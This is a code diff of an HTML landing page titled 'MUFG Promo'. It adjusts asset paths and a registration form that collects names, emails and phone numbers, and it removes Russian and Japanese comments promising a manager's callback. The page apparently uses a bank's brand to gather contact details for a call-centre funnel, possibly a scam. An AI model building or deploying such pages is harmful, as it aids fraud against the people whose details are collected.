@@ -4,13 +4,13 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>MUFG Promo</title>
-    <link rel="stylesheet" href="../assets/css/style.css">
+    <link rel="stylesheet" href="/assets/css/style.css">
     <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons/font/bootstrap-icons.css" rel="stylesheet">
-    <link rel="shortcut icon" href="../assets/images/favicon.ico">
-    <link rel="icon" sizes="16x16 32x32 64x64" href="../assets/images/favicon.ico">
-    <link rel="icon" type="image/png" sizes="32x32" href="../assets/images/favicon-32x32.png">
-    <link rel="icon" type="image/png" sizes="16x16" href="../assets/images/favicon-16x16.png">
-    <link rel="apple-touch-icon" href="../assets/images/apple-touch-icon.png">
+    <link rel="shortcut icon" href="assets/images/favicon.ico">
+    <link rel="icon" sizes="16x16 32x32 64x64" href="assets/images/favicon.ico">
+    <link rel="icon" type="image/png" sizes="32x32" href="assets/images/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="assets/images/favicon-16x16.png">
+    <link rel="apple-touch-icon" href="assets/images/apple-touch-icon.png">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
 <link href="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.12/css/intlTelInput.css" rel="stylesheet" />
 <script src="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.12/js/intlTelInput.js"></script>
@@ -29,7 +29,7 @@
             <div class="containerl">
                 <div class="top">
                     <a href="#form" class="icon">
-                                      <img src="../assets/images/ll.png" alt=""style="width: 100%;">
+                                      <img src="assets/images/ll.png" alt=""style="width: 100%;">
                     </a>
                 </div>
                 <div class="box">
@@ -90,23 +90,16 @@
 
                 <span class="form-title gradient-text">You can register by filling out the form below:</span>
 
-    <form action="/send" method="POST" id="form" onsubmit="return checkbtn(event)" class="form-container animated">
+    <form action="send.php" method="POST" id="form" onsubmit="return checkbtn(event)" class="form-container animated">
         <input type="text" name="first_name" placeholder="First name" required="">
         <input type="text" name="last_name" placeholder="Last name" required="">
         <input type="email" name="email" placeholder="Email" required="">
-        <input type="tel" name="phone" placeholder="Phone number" required="">
+        <input type="tel" name="phone_number" placeholder="Phone number" required="">
         <br style="margin-bottom: 15px;">
         <!--<button type="submit">登録する</button>-->
-        <!-- <p>Если у тебя уже есть аккаунт нажми сюда <a id="openDialog"></a></p> -->
         <div class="gradient-button example-2">
-            <button id="fill" class="inner2"> Create account
-            </button>
-
+            <button id="fill" class="inner2" type="submit"> Create account</button>
         </div>
-        <!-- <p>📞 重要！ご応募いただいた後、弊社マネージャーより確認のご連絡を差し上げます。</p>
-        <p>お電話は数分で終わります。無視しないでください！</p> -->
-
- 
         <p>Our team will be happy to provide you with the assistance you need to find the best solution.</p>
     </form>
         </div>
@@ -116,7 +109,7 @@
             <div class="containerl">
                 <div class="top">
                     <a href="#" class="icon">
-                <img src="../assets/images/ll.png" alt=""style="width: 100%;"></a>
+                <img src="assets/images/ll.png" alt=""style="width: 100%;"></a>
                 </div>
                 <div class="box">
                     <span style="--i:0"></span>
@@ -125,14 +118,11 @@
                     <span style="--i:3"></span>
                 </div>
             </div>
-                <!-- <img src="serhii.png" alt="MUFG"> -->
-            <!-- <img src="7.png" alt="MUFG"> -->
+
             <span>MUFG</span>
         </div>
     </section>
-
-
 </body>
 
-<script src="../assets/js/script.js"></script>
+<script src="assets/js/script.js"></script>
 </html>
